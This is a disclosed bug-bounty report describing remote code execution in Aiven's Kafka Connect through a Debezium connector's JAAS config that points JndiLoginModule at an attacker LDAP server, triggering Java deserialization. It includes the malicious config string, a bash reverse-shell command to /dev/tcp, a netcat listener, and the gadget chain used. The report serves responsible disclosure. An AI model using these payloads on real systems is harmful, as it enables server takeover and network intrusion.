# Kafka Connect RCE via connector SASL  JAAS JndiLoginModule configuration

## Report Details
- **Report ID**: 1529790
- **URL**: https://hackerone.com/reports/1529790
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-04-04T09:56:31.884Z
- **Disclosed**: 2022-11-08T06:30:19.406Z

## Reporter
- **Username**: jarij
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: aiven_ltd

## Vulnerability Information
## Summary:
When configuring the connector via the Aiven API or the Kafka Connect REST API, the attacker can set the `database.history.producer.sasl.jaas.config` connector property for the `io.debezium.connector.mysql.MySqlConnector` connector. This is likely true for other debezium connectors too.  By setting the connector value to `"com.sun.security.auth.module.JndiLoginModule required user.provider.url="ldap://attacker_server" useFirstPass="true" serviceName="x" debug="true" group.provider.url="xxx";"`, the server will connect to the attacker's LDAP server and it deserializes the LDAP response, which the attacker can use to execute java deserialization gadget chains on the kafka connect server.

## Steps To Reproduce:
██████

  1. Login into my VPS:  `ssh ███████`, password: `█████`
  1. Execute `java -jar RogueJndi-1.1.jar --hostname ███ -c "bash -c bash\${IFS}-i\${IFS}>&/dev/tcp/███/4445<&1"`
  1. Execute `nc -nlvp 4445` on another tab
  1. Execute `python3 poc.py` on another table. This poc script launches the exploit against my Aiven kafka connect instance.
  1. Reverse shell connection should now be established


## The gadget chain

The exploit uses `System.setProperty` gadget chain in the scala standard library to enable unsafe deserialization of apache commons collections transformers (finding this gadget chain took way too much time...). This payload has been designed for the Scala version 2.13.6. It may fail on other scala versions. Then the script executes the reverse shell setup command using the [CommonsCollections7](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections7.java) payload.

## Impact

Attacker can execute commands on the server and access other resources on the network.

## Attachments
- RogueJndi-1.1.jar
- rogue-jndi-src.zip
